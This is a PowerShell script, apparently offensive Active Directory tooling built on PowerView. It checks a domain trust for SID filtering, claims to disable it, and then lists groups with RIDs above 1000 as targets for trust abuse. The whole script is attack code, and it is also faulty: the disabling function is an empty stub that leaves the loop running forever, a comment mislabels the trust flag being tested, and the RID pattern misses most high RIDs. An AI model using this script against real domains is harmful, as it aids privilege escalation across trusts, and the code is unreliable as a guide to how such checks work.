param (
    [string]$TargetDomain
)

# Import PowerView if not already loaded
if (-not (Get-Command Get-DomainTrust -ErrorAction SilentlyContinue)) {
    Import-Module .\PowerView.ps1
}

# Function to get trust attributes using PowerView
function Get-TrustAttributes {
    param ($TargetDomain)
    $trust = Get-DomainTrust | Where-Object { $_.TargetName -eq $TargetDomain }
    return $trust.TrustAttributes
}

# Function to disable SID filtering (TREAT_AS_EXTERNAL) using PowerView
function Disable-SIDFiltering {
    param ($TargetDomain)
    Write-Host "[*] Attempting to disable SID filtering for $TargetDomain using PowerView..."
    # PowerView doesn't have built-in trust attribute modification, but this can simulate it
    # Ideally, this would require another manual step for actual trust modification
    # You can also use a trusted session or attack to modify it manually if needed
}

# Function to enumerate groups with RIDs higher than 1000 using PowerView
function Get-GroupsWithHighRIDs {
    param ($TargetDomain)
    Write-Host "[*] Enumerating groups with RIDs higher than 1000 in $TargetDomain..."
    Get-DomainGroup -Domain $TargetDomain | 
        Where-Object { $_.SID -match '-1[0-9]{3}$' } | # Matches groups with RIDs > 1000
        Select-Object Name, SID
}

# Main script logic
while ($true) {
    $trustAttributes = Get-TrustAttributes -TargetDomain $TargetDomain

    # Check if TREAT_AS_EXTERNAL is active (SID filtering enabled)
    if ($trustAttributes -band 0x00000004) {
        Write-Host "[*] SID filtering is active on $TargetDomain. Disabling..."
        Disable-SIDFiltering -TargetDomain $TargetDomain
        Start-Sleep -Seconds 10 # Wait a bit before rechecking
    } else {
        Write-Host "[*] SID filtering is disabled on $TargetDomain."
        break
    }
}

# Once SID filtering is disabled, find groups with RIDs > 1000
Get-GroupsWithHighRIDs -TargetDomain $TargetDomain

